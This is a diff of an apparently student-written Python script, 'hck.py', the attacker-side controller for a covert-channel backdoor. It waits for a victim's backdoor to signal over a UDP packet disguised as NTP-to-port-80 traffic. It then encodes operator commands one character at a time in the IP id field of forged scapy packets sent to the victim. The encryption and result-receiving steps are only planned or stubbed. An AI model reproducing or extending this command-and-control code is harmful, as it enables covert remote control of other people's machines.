@@ -2,7 +2,14 @@
 # hck.py 
 # 
 # main functions:
-#	- get input from hacker (cmd)
+#	- 0. wait until client runs backdoor program    X
+#	- 1. get input (command to execute in the backdoor program)   X
+#	- 2. encrypt the command data      X
+#	- 3. send encrypted data to backdoor client  X
+#	- 4. wait for the response from backdoor program
+#	- 5. get the results
+#	- 6. decrypt the results
+# 	- 7. save the decrypted results
 #	- 
 # ###################################################################
 from scapy.all import *
@@ -13,7 +20,8 @@ import socket
 import fcntl
 import struct
 
-pw = ""
+WAITING = 0
+KEY = "runningman"
 mypacket = IP()
 serv_addr = "192.168.0.16"	# by default
 clnt_addr = "192.168.1.8"	# by default
@@ -36,53 +44,65 @@ def parse_arguments():
 	return parser.parse_args()
 
 def client_ran_backdoor(pkt):
-	print "client ran backdoor"
-
+	if pkt[IP].id == ord('K'):
+		print "Client ran backdoor."
+	else:
+		print "[ERROR] Sniffed wrong packet."
+		exit(1)
 
 def main():
-	global pw
+	global WAITING
+	global KEY
+
 	#args = parse_arguments()
 
 	# get network interface
 	serv_addr = get_ip_address('eno1')
 
 
-	# wait until client run backdoor program
-	while True:
-		print "Sniffing..."
-		sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor)
-
+	# 0. wait until client runs backdoor program
+	print "Sniffing..."
+	sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor, count=1)
 
 	#if(args.dest_ip is not None):
 	# store backdoor client address
 	#clnt_addr = args.dest_ip   
 
 	# ask for the password for encryption
-	pw = raw_input("Set a password for encryption: ")
+	#pw = raw_input("Set a password for encryption: ")
 
-	# get command	
-	cmd = raw_input("# ")
-	# encrypt the command before sending it to victim's machine
-	#enc_cmd = encrypt(cmd, pw)
+	while True:
+		if WAITING == 0:
+			# get command	
+			print "Give me a command..."
+			cmd = raw_input("# ")
 
-	# send to victim using scapy
-	# how to put random data on each field
-	
-	mypacket = IP()/fuzz(UDP())
-	print serv_addr
-	mypacket.src = serv_addr
-	mypacket.dst = clnt_addr
+			# encrypt the command before sending it to victim's machine
+			#enc_cmd = encrypt(cmd, KEY)
 
-	#print enc_cmd
-	i = 0
-	for c in cmd:
-		mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
-		print "#", i
-		i = i + 1
-		# send forged packet
-		send(mypacket)
+			# send to client  using scapy
+			# how to put random data on each field
+			
+			mypacket = IP()/fuzz(UDP())
+			mypacket.src = serv_addr
+			mypacket.dst = clnt_addr
+			mypacket.sport = 123
+			mypacket.dport = 80
 
-	# recv the result
+			i = 0
+			for c in cmd:
+				mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
+				print "#", i, c
+				i = i + 1
+				# send forged packet
+				send(mypacket)
+
+			WAITING = 1
+		
+		else:		# WAITING = 1
+			# recv the result
+			print "Waiting for results..."
+
 
 
 if __name__ == '__main__':
